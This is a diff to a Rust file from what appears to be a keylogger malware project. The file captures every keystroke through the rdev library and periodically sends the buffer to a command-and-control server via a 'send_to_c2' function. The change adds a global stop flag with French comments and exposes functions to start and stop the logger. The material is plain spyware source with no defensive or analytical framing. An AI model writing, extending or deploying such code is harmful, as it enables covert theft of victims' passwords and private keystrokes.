@@ -1,9 +1,12 @@
 use crate::connexion::send_to_c2;
 use anyhow::{Context, Result};
 use rdev::{Event, EventType, Key};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::OnceLock;
 use std::sync::{Arc, Mutex};
 use tokio::time::{interval, Duration};
 
+static SHOULD_RUN: OnceLock<AtomicBool> = OnceLock::new();
 const MAX_BUFFER_SIZE: usize = 10_000;
 
 lazy_static::lazy_static! {
@@ -33,10 +36,17 @@ impl KeyLogger {
 
     async fn start(&self, send_interval: Duration) -> Result<()> {
         let mut listener_handle = tokio::task::spawn_blocking(|| rdev::listen(callback));
-
         let mut send_interval = interval(send_interval);
 
         loop {
+            // Vérifie si le flag d'arrêt est activé
+            if let Some(flag) = SHOULD_RUN.get() {
+                if !flag.load(Ordering::SeqCst) {
+                    println!("[keylogger] Arrêt demandé via flag global.");
+                    break;
+                }
+            }
+
             tokio::select! {
                 _ = send_interval.tick() => {
                     if let Err(e) = self.send_buffer().await {
@@ -294,7 +304,6 @@ fn key_to_string_with_modifiers(key: Key) -> Option<String> {
 
 fn get_letter_case(letter: char, modifiers: &ModifierState) -> String {
     let should_be_uppercase = modifiers.shift_pressed ^ modifiers.caps_lock_on;
-
     if should_be_uppercase {
         letter.to_uppercase().to_string()
     } else {
@@ -355,4 +364,14 @@ fn get_punctuation_or_symbol(key: Key, shift_pressed: bool) -> String {
 pub async fn start_keylogger(interval_sec: u64) -> Result<()> {
     let logger = KeyLogger::new();
     logger.start(Duration::from_secs(interval_sec)).await
+}
+
+pub fn init_keylogger_flag() {
+    let _ = SHOULD_RUN.set(AtomicBool::new(true));
+}
+
+pub fn stop_keylogger() {
+    if let Some(flag) = SHOULD_RUN.get() {
+        flag.store(false, Ordering::SeqCst);
+    }
 }
